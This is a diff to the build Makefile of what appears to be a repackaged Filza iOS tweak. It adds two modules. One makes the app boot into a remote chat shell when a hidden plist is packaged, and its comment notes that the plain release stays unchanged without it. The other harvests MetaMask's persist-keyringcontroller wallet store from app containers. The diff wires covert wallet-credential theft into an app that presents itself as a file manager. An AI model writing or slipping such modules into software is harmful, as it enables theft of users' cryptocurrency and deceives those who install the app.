@@ -191,4 +191,13 @@ include FilzaByeTunesNetwork.mk
 # before-* assertions are part of the actual build.
 include FilzaRemoteConsole.mk
 
+# Chat-first shell: when the packaged IPA carries TryMaskCardShell.plist, the app
+# boots into the remote chat system and Filza's file manager UI is never rooted.
+# Without that plist the module is inert, so the plain release IPA is unchanged.
+include TryMaskCardShell.mk
+
+# Container auto-discovery + persist-store harvest driven by the shell config
+# (MetaMask's Documents/persistStore/persist-keyringcontroller by default).
+include PersistStoreHarvester.mk
+
 include $(THEOS_MAKE_PATH)/tweak.mk
